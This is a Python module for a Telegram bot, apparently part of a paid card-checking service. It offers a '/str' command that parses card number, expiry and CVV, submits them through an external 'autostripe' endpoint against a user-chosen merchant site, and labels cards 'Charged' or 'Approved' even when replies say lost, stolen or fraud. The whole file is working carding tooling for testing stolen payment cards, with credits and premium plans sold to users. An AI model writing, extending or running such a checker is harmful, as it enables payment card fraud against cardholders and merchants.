import re
import os
import json
import httpx
from time import time
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.enums import ChatType

# AutoStripe API Config
AUTOSTRIPE_BASE_URL = "https://blackxcard-autostripe.onrender.com"
AUTOSTRIPE_GATEWAY = "autostripe"
AUTOSTRIPE_KEY = "Blackxcard"

def load_users():
    try:
        with open("DATA/users.json", "r") as f:
            return json.load(f)
    except:
        return {}

def load_allowed_groups():
    try:
        with open("DATA/groups.json", "r") as f:
            return json.load(f)
    except:
        return []

def get_autostripe_info(user_id):
    try:
        with open("DATA/sites.json", "r") as f:
            sites = json.load(f)
        return sites.get(str(user_id))
    except:
        return None

def has_credits(user_id):
    try:
        with open("DATA/users.json", "r") as f:
            users = json.load(f)
        user = users.get(str(user_id))
        if not user:
            return False
        credits = user.get("plan", {}).get("credits", 0)
        if credits == "∞":
            return True
        return int(credits) > 0
    except:
        return False

def deduct_credit(user_id):
    try:
        with open("DATA/users.json", "r") as f:
            users = json.load(f)
        user = users.get(str(user_id))
        if not user:
            return False, "User not found"
        credits = user["plan"].get("credits", 0)
        if credits == "∞":
            return True, "Infinite credits"
        if int(credits) > 0:
            user["plan"]["credits"] = str(int(credits) - 1)
            users[str(user_id)] = user
            with open("DATA/users.json", "w") as f:
                json.dump(users, f, indent=4)
            return True, "Credit deducted"
        return False, "No credits"
    except Exception as e:
        return False, str(e)

def extract_card(text):
    match = re.search(r'(\d{12,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})', text)
    if match:
        return match.groups()
    return None

def clean_response(raw_response):
    """Clean and extract only the important response message"""
    response = str(raw_response).strip()
    
    # Try to parse as JSON and extract response/message field
    try:
        import json as js
        data = js.loads(response)
        if isinstance(data, dict):
            for key in ['response', 'message', 'msg', 'error', 'status', 'result']:
                if key in data:
                    return str(data[key])[:80]
    except:
        pass
    
    # Try regex to extract response field
    try:
        match = re.search(r'"(?:response|message|msg)"\s*:\s*"([^"]+)"', response, re.IGNORECASE)
        if match:
            return match.group(1)[:80]
    except:
        pass
    
    # Clean up JSON-like characters
    response = response.replace('{', '').replace('}', '').replace('"', '').replace("'", "")
    response = re.sub(r'response\s*:', '', response, flags=re.IGNORECASE).strip()
    response = re.sub(r'message\s*:', '', response, flags=re.IGNORECASE).strip()
    
    for prefix in ['response:', 'message:', 'error:', 'result:']:
        if response.lower().startswith(prefix):
            response = response[len(prefix):].strip()
    
    if len(response) > 80:
        response = response[:80]
    
    return response if response else "No Response"

def get_status_flag(raw_response):
    response_upper = str(raw_response).upper()
    
    if any(keyword in response_upper for keyword in [
        "CHARGED", "ORDER_PLACED", "ORDER PLACED", "THANK YOU", "PAYMENT SUCCESS"
    ]):
        return "Charged 💎"
    elif any(keyword in response_upper for keyword in [
        "SUCCEED", "SUCCESS", "CCN", "CVN", "LIVE", "3DS", "3D_SECURE", "3D SECURE",
        "INSUFFICIENT_FUNDS", "INSUFFICIENT FUNDS", "INVALID_CVC", "INVALID CVC",
        "INCORRECT_CVC", "INCORRECT CVC", "CVV", "CVC", "AUTHENTICATION",
        "ZIP", "ADDRESS", "BILLING", "CARD_ERROR", "CARD ERROR", "RISK", "FRAUD",
        "LIMIT", "DO_NOT_HONOR", "DO NOT HONOR", "LOST", "STOLEN", "TRY_AGAIN",
        "APPROVED"
    ]):
        return "Approved ✅"
    else:
        return "Declined ❌"

async def check_autostripe(site, cc):
    url = f"{AUTOSTRIPE_BASE_URL}/gateway={AUTOSTRIPE_GATEWAY}/key={AUTOSTRIPE_KEY}/site={site}/cc={cc}"
    try:
        async with httpx.AsyncClient(timeout=120.0) as client:
            response = await client.get(url)
            return response.text.strip() if response.text else "No Response"
    except httpx.TimeoutException:
        return "Timeout"
    except:
        return "Error"

def is_free_user(user_id):
    """Check if user has free plan"""
    try:
        users = load_users()
        user = users.get(str(user_id))
        if not user:
            return True
        plan = user.get("plan", {}).get("plan", "Free")
        return plan in ["Free", "Redeem Code"]
    except:
        return True

@Client.on_message((filters.command("str") | filters.regex(r"^\.str(\s|$)")) & ~filters.edited)
async def handle_autostripe(client, message):
    try:
        allowed_groups = load_allowed_groups()
        user_id = str(message.from_user.id)
        
        # Check if in private chat
        if message.chat.type == ChatType.PRIVATE:
            if is_free_user(user_id):
                return await message.reply(
                    "<pre>Notification ❗️</pre>\n"
                    "<b>~ Message :</b> <code>Free users can only check in groups!</code>\n"
                    "<b>~ Get Premium to use in private</b>\n"
                    "━━━━━━━━━━━━━\n"
                    "<b>Type <code>/buy</code> to get Premium.</b>",
                    reply_to_message_id=message.id
                )
        elif message.chat.type in [ChatType.GROUP, ChatType.SUPERGROUP]:
            if message.chat.id not in allowed_groups:
                return await message.reply(
                    "<pre>Notification ❗️</pre>\n"
                    "<b>~ Message :</b> <code>This Group Is Not Approved ⚠️</code>\n"
                    "━━━━━━━━━━━━━\n"
                    "<b>Contact Owner For Approving</b>"
                )
        
        users = load_users()
        
        if user_id not in users:
            return await message.reply(
                "<pre>Access Denied 🚫</pre>\n<b>Register first using</b> <code>/register</code>",
                reply_to_message_id=message.id
            )
        
        if not has_credits(user_id):
            return await message.reply(
                "<pre>Notification ❗️</pre>\n<b>Message :</b> <code>Insufficient Credits</code>\n<b>Type <code>/buy</code> to get Credits.</b>",
                reply_to_message_id=message.id
            )
        
        user_site_info = get_autostripe_info(user_id)
        if not user_site_info:
            return await message.reply(
                "<pre>Site Not Found ⚠️</pre>\n<code>Use /addurl to add site first</code>",
                reply_to_message_id=message.id
            )
        
        target_text = None
        if message.reply_to_message and message.reply_to_message.text:
            target_text = message.reply_to_message.text
        elif len(message.text.split(maxsplit=1)) > 1:
            target_text = message.text.split(maxsplit=1)[1]
        
        if not target_text:
            return await message.reply(
                "<pre>CC Not Found ❌</pre>\n<b>Usage:</b> <code>/str cc|mm|yy|cvv</code>",
                reply_to_message_id=message.id
            )
        
        extracted = extract_card(target_text)
        if not extracted:
            return await message.reply(
                "<pre>Invalid Format ❌</pre>\n<b>Usage:</b> <code>/str cc|mm|yy|cvv</code>",
                reply_to_message_id=message.id
            )
        
        card, mes, ano, cvv = extracted
        fullcc = f"{card}|{mes}|{ano}|{cvv}"
        site = user_site_info['site']
        gate = user_site_info.get('gate', 'AutoStripe')
        
        start_time = time()
        
        loading_msg = await message.reply(
            f"<pre>Processing..!</pre>\n━━━━━━━━━━━━\n• <b>Card -</b> <code>{fullcc}</code>\n• <b>Gate -</b> <code>{gate}</code>",
            reply_to_message_id=message.id
        )
        
        result = await check_autostripe(site, fullcc)
        
        end_time = time()
        timetaken = round(end_time - start_time, 2)
        
        # Clean the response
        clean_result = clean_response(result)
        status_flag = get_status_flag(result)
        
        profile = f"<a href='tg://user?id={user_id}'>{message.from_user.first_name}</a>"
        
        user_data = users.get(user_id, {})
        plan = user_data.get("plan", {}).get("plan", "Free")
        badge = user_data.get("plan", {}).get("badge", "🎟️")
        
        final_msg = f"""<b>[#AutoStripe] | Sos</b> ✦
━━━━━━━━━━━━━━━
<b>[•] Card</b>- <code>{fullcc}</code>
<b>[•] Gateway</b> - <b>{gate}</b>
<b>[•] Status</b>- <code>{status_flag}</code>
<b>[•] Response</b>- <code>{clean_result}</code>
━━━━━━━━━━━━━━━
<b>[ﾒ] Checked By</b>: {profile} [<code>{plan} {badge}</code>]
<b>[ﾒ] T/t</b>: <code>[{timetaken} 𝐬]</code>"""
        
        buttons = InlineKeyboardMarkup([
            [
                InlineKeyboardButton("Support", url="https://t.me/SoskeUI"),
                InlineKeyboardButton("Plans", callback_data="plans_info")
            ]
        ])
        
        await loading_msg.edit(final_msg, reply_markup=buttons, disable_web_page_preview=True)
        
        deduct_credit(user_id)
    
    except Exception as e:
        await message.reply(f"<code>Error occurred</code>", reply_to_message_id=message.id)
